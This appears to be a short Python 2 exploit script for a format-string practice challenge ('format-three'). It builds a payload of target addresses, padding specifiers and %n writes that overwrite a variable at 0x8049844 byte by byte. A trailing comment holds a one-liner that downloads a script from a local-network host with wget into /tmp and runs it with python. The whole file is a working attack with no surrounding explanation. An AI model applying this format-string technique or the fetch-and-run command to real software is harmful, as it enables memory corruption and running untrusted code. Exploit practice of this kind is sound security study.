import sys
'''
One solution is to put a big number before %x to accommodate for needed value
Another solution attempts to overwrite values byte by byte
This script combines both methods
'''

alignment = "AAAA"
#fmt_str = "%x" * 10 + "%1682274316x" + "%n"
fmt_str = "%c" * 10 + "%39x" + "%n" + "%51x" + "%n" + "%25549x" + "%n"


#0x8049844  -> changeme32
addr1 = "\x44\x98\x04\x08"
addr2 = "\x45\x98\x04\x08"
addr3 = "\x46\x98\x04\x08"
addr4 = "\x47\x98\x04\x08"

payload = addr1 + alignment + addr2 + alignment + addr3 + fmt_str

print payload

#./format-three < <(wget -q -O /tmp/input.py http://192.168.8.119:8000/format-three.py && python /tmp/input.py)
